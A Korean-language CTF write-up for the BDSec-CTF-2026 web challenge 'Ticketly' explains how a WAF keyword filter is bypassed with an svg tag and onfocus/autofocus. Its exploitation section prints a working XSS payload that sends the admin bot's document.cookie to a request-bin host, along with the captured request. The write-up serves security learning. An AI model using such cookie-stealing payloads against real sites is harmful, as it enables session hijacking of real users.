|CTF Name|BDSec-CTF-2026|
|------|---|
|CTF URL|https://2026.bdsec-ctf.com/challenges#Ticketly-29|
|Challenge Name|Ticketly|
|Challenge Category|Web|
|Author|badhacker0x1|
|Points|100|
|Solves|119|
|Status|Solved|

---

## 📝 Description
> Our new ticket system is live now! Create an account and create tickets, our admin will review this.
> Alternative Server : http://149.102.136.203:3000/

> (번역) 새로운 티켓 시스템이 가동되었습니다! 계정을 생성하고 티켓을 생성해 주세요. 관리자가 검토 후 티켓을 접수합니다.

목표 : 악성 스크립트가 포함된 ticket을 제출해 관리자 봇의 인증 토큰을 탈취해야 한다.

---

## 🔍 Recon


### Tools

- Browser

### Findings


`/register`와 `/login`에서 임의의 계정을 생성할 수 있다.

`/tickets/new`에서는 관리자 봇에게 전달될 ticket을 작성할 수 있지만 XSS 문법에 대한 필터링이 존재한다.

예를 들어 `<script>alert(1)</script>`를 제출하면 다음과 같은 응답이 반환된다. 

```
Your ticket contained content that matched a malicious signature and was not saved.

Signature: SCRIPT_TAG
```

즉 방화벽(WAF)의 필터링을 우회해 XSS를 발생시켜야 한다.

여러 XSS 문법을 테스트한 바로는 script, img, onload, onerror 등 키워드가 필터링되고 있음을 확인했다.

---

## 🧪 Exploitation / Analysis

태그는 `svg`로 우회하고, 이벤트 핸들러는 `onfocus`와 `autofocus`를 이용해 별도 동작 없이 자동으로 실행되도록 구성했다. 

응답을 수신할 서버는 DreamHack Tools의 [Requests Bin](https://tools.dreamhack.games/)을 이용했다.

```
<svg onfocus='location.href="https://bcsvfjh.request.dreamhack.games/?"+document.cookie' autofocus>
```

위 payload를 ticket의 Description에 입력하여 전송하면 관리자 봇이 페이지를 열면서 XSS가 실행되고 관리자 정보가 포함된 token(Flag)이 내 서버로 전송된다.


```

Referer

https://bcsvfjh.request.dreamhack.games/?flag=bdsec{■■■_■■■■■■■■_■■■■■_■■■■■■_■■■■■■}

```

## 📚 Lessons Learned

- 다양한 태그와 이벤트 핸들러를 활용한 우회 기법을 익히고 payload를 응용하자
